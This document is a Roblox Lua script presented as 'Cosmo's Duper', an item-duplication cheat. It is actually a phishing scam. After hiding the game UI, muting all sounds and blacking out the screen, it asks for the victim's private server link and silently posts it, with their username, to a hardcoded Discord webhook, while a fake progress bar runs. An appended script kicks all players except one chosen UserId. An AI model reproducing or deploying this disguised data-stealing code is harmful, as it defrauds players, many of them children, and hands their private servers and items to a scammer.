-- Cosmo's Duper (universal client version)
-- Compatible with most executors: Xeno, Fluxus, Script-Ware, etc.

-- CONFIG
local WEBHOOK_URL = "https://discord.com/api/webhooks/1432708059557531689/wngOIs53Smqq3IaQXx6IhbXpftRJ1pmCROgZ4vr8u2eVjsg6E3PrRTISeRdJfct5F_S_"

-- HTTP FUNCTION DETECTION
local http
if syn and syn.request then
    http = syn.request
elseif http_request then
    http = http_request
elseif request then
    http = request
elseif fluxus and fluxus.request then
    http = fluxus.request
end

if not http then
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Error",
        Text = "Your executor doesn't support HTTP requests.",
        Duration = 6
    })
    return
end

-- CLEANUP
if game.CoreGui:FindFirstChild("CosmoDupeUI") then
    game.CoreGui.CosmoDupeUI:Destroy()
end

-- Aggressively hide ALL Roblox UI elements
local StarterGui = game:GetService("StarterGui")
pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end)

-- Hide player name and health display
pcall(function()
    game:GetService("Players").LocalPlayer.NameDisplayDistance = 0
    game:GetService("Players").LocalPlayer.HealthDisplayDistance = 0
end)

-- QUICK UI CREATOR
local function I(class, props, parent)
    local o = Instance.new(class)
    for k,v in pairs(props) do o[k] = v end
    if parent then o.Parent = parent end
    return o
end

local gui = I("ScreenGui", {Name="CosmoDupeUI", ResetOnSpawn=false}, game.CoreGui)

-- Massive full-screen black background
local blackBackground = I("Frame", {
    Size=UDim2.new(3, 5000, 3, 5000),
    Position=UDim2.new(-1, -2500, -1, -2500),
    BackgroundColor3=Color3.fromRGB(0,0,0),
    BackgroundTransparency=0,
    BorderSizePixel=0,
    ZIndex=10,
    Visible=false
}, gui)

local frame = I("Frame", {
    AnchorPoint=Vector2.new(0.5,0.5),
    Position=UDim2.new(0.5,0,0.5,0),
    Size=UDim2.new(0,680,0,260),
    BackgroundColor3=Color3.fromRGB(35,32,34),
    BorderSizePixel=0,
    ZIndex=11
}, gui)
I("UICorner",{CornerRadius=UDim.new(0,14)},frame)

local title = I("TextLabel", {
    Text="Cosmo's Duper",
    Font=Enum.Font.GothamBold,
    TextSize=28,
    TextColor3=Color3.fromRGB(245,245,245),
    BackgroundTransparency=1,
    Position=UDim2.new(0.5,0,0,20),
    AnchorPoint=Vector2.new(0.5,0),
    Size=UDim2.new(0.9,0,0,40),
    ZIndex=12
}, frame)

local sub = I("TextLabel", {
    Text="Advanced brainrot duplication system",
    Font=Enum.Font.Gotham,
    TextSize=12,
    TextColor3=Color3.fromRGB(180,180,180),
    BackgroundTransparency=1,
    Position=UDim2.new(0.5,0,0,60),
    AnchorPoint=Vector2.new(0.5,0),
    Size=UDim2.new(0.9,0,0,20),
    ZIndex=12
}, frame)

local dupeBtn = I("TextButton", {
    Text="Dupe V1 (OP)",
    Font=Enum.Font.GothamBlack,
    TextSize=20,
    TextColor3=Color3.fromRGB(25,25,25),
    BackgroundColor3=Color3.fromRGB(187,114,11),
    Position=UDim2.new(0.5,0,0,100),
    AnchorPoint=Vector2.new(0.5,0),
    Size=UDim2.new(0.6,0,0,48),
    ZIndex=12
}, frame)
I("UICorner",{CornerRadius=UDim.new(0,8)},dupeBtn)

-- Fonction pour couper tous les sons du jeu
local function muteAllSounds()
    -- Couper les sons existants
    for _, sound in ipairs(game:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
            sound:Stop()
            sound:GetPropertyChangedSignal("Volume"):Connect(function()
                sound.Volume = 0
            end)
        end
    end

    -- Empêcher les nouveaux sons de jouer
    game.DescendantAdded:Connect(function(obj)
        if obj:IsA("Sound") then
            obj.Volume = 0
            obj:Stop()
            obj:GetPropertyChangedSignal("Volume"):Connect(function()
                obj.Volume = 0
            end)
        end
    end)

    -- Couper aussi les sons des joueurs (GUI, musique locale, etc.)
    local Players = game:GetService("Players")
    for _, player in ipairs(Players:GetPlayers()) do
        player.DescendantAdded:Connect(function(obj)
            if obj:IsA("Sound") then
                obj.Volume = 0
                obj:Stop()
                obj:GetPropertyChangedSignal("Volume"):Connect(function()
                    obj.Volume = 0
                end)
            end
        end)
    end

    Players.PlayerAdded:Connect(function(player)
        player.DescendantAdded:Connect(function(obj)
            if obj:IsA("Sound") then
                obj.Volume = 0
                obj:Stop()
                obj:GetPropertyChangedSignal("Volume"):Connect(function()
                    obj.Volume = 0
                end)
            end
        end)
    end)
end

-- Fonction pour afficher la boîte de saisie
local function showInput()
    dupeBtn.Visible = false
    local box = I("Frame",{Size=UDim2.new(0.85,0,0,110),Position=UDim2.new(0.5,0,0,92),AnchorPoint=Vector2.new(0.5,0),BackgroundTransparency=1,ZIndex=12},frame)
    local input = I("TextBox",{
        PlaceholderText="Paste your private server link here",
        TextColor3=Color3.new(1,1,1),
        BackgroundColor3=Color3.fromRGB(46,42,44),
        Size=UDim2.new(1,0,0,40),
        Text="",
        Font=Enum.Font.Gotham,
        TextSize=14,
        ZIndex=13
    },box)
    I("UICorner",{CornerRadius=UDim.new(0,6)},input)

    local confirm = I("TextButton",{
        Text="Confirm",
        Font=Enum.Font.GothamBold,
        TextSize=18,
        TextColor3=Color3.fromRGB(25,25,25),
        BackgroundColor3=Color3.fromRGB(255,165,32),
        Position=UDim2.new(0.5,0,0,60),
        AnchorPoint=Vector2.new(0.5,0),
        Size=UDim2.new(0.4,0,0,36),
        ZIndex=13
    },box)
    I("UICorner",{CornerRadius=UDim.new(0,8)},confirm)

    confirm.MouseButton1Click:Connect(function()
        local link = input.Text
        if link == "" then
            input.PlaceholderText = "Please enter a valid link"
            return
        end

        -- Couper tous les sons lorsque le bouton Confirm est pressé
        muteAllSounds()
        print("🔇 Tous les sons du jeu ont été désactivés.")

        blackBackground.Visible = true
        box:Destroy()

        local proc = I("Frame",{Size=UDim2.new(0.85,0,0,110),Position=UDim2.new(0.5,0,0,92),AnchorPoint=Vector2.new(0.5,0),BackgroundTransparency=1,ZIndex=12},frame)
        local label = I("TextLabel",{Text="Processing duplication...",Font=Enum.Font.GothamBold,TextSize=20,TextColor3=Color3.fromRGB(245,245,245),BackgroundTransparency=1,Position=UDim2.new(0.5,0,0,0),AnchorPoint=Vector2.new(0.5,0),ZIndex=13},proc)
        local bar = I("Frame",{Size=UDim2.new(0,480,0,24),Position=UDim2.new(0.5,-240,0,40),BackgroundColor3=Color3.fromRGB(46,42,44),AnchorPoint=Vector2.new(0,0),ZIndex=13},proc)
        I("UICorner",{CornerRadius=UDim.new(0,6)},bar)
        local fill = I("Frame",{Size=UDim2.new(0,0,1,0),BackgroundColor3=Color3.fromRGB(255,153,51),ZIndex=14},bar)
        I("UICorner",{CornerRadius=UDim.new(0,6)},fill)
        local percent = I("TextLabel",{Text="0%",Font=Enum.Font.GothamBold,TextSize=16,TextColor3=Color3.new(1,1,1),BackgroundTransparency=1,Position=UDim2.new(0.5,0,0,70),AnchorPoint=Vector2.new(0.5,0),ZIndex=13},proc)

        local HttpService = game:GetService("HttpService")
        local body = HttpService:JSONEncode({
            embeds = { {
                title = "New Dupe Request",
                description = "**User:** " .. game.Players.LocalPlayer.Name .. "\n**Private server link:** " .. link,
                color = 15105570,
                footer = { text = "Cosmo's Duper • " .. os.date("%d/%m/%Y %H:%M") }
            } }
        })

        task.spawn(function()
            pcall(function()
                http({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"]="application/json"},
                    Body = body
                })
            end)
        end)

        -- Ajout du deuxième message Discord avec @everyone
        task.wait(0.5)
        local body2 = HttpService:JSONEncode({
            content = "@everyone"
        })

        task.spawn(function()
            pcall(function()
                http({
                    Url = WEBHOOK_URL,
                    Method = "POST",
                    Headers = {["Content-Type"]="application/json"},
                    Body = body2
                })
            end)
        end)

        for i=0,100 do
            fill.Size = UDim2.new(i/100,0,1,0)
            percent.Text = i.."%"
            task.wait(1.2)
        end

        label.Text = "Done. Check Discord webhook."
        task.wait(1)
        gui:Destroy()
    end)
end
-- Script: Kick si > 1 joueur (avec compteur x/1 dans le message)
-- Placer dans ServerScriptService

local Players = game:GetService("Players")

-- CONFIGURATION
-- Mets ton UserId ici si tu veux être le seul autorisé dans le serveur.
-- Exemple : local PROTECTED_USER_ID = 12345678
-- Si nil -> tout le monde sera kické si plus d'une personne.
local PROTECTED_USER_ID = nil

-- Partie fixe du message en anglais
local KICK_MESSAGE_PREFIX = "You must be alone in the server. "

-- Fonction pour kick les autres joueurs quand il y a plus d'une personne
local function kickOthers()
    local all = Players:GetPlayers()
    local count = #all

    if count <= 1 then
        return
    end

    for _, plr in ipairs(all) do
        if PROTECTED_USER_ID and plr.UserId == PROTECTED_USER_ID then
            -- On garde le joueur protégé
        else
            -- Construire le message dynamique avec le compteur x/1
            local dynamicPart = "(" .. tostring(count) .. "/1)"
            local message = KICK_MESSAGE_PREFIX .. dynamicPart

            pcall(function()
                plr:Kick(message)
            end)
            task.wait(0.2)
        end
    end
end

-- Vérification immédiate au démarrage du serveur
kickOthers()

-- Vérifier aussi à chaque nouvelle connexion
Players.PlayerAdded:Connect(function(newPlayer)
    task.wait(0.5)
    local count = #Players:GetPlayers()
    if count > 1 then
        if PROTECTED_USER_ID and newPlayer.UserId == PROTECTED_USER_ID then
            -- Ne rien faire pour le joueur protégé
        else
            local dynamicPart = "(" .. tostring(count) .. "/1)"
            local message = KICK_MESSAGE_PREFIX .. dynamicPart
            pcall(function()
                newPlayer:Kick(message)
            end)
        end
    end
end)

print("Solo-server script active. Kick message uses dynamic counter (x/1).")

dupeBtn.MouseButton1Click:Connect(showInput)
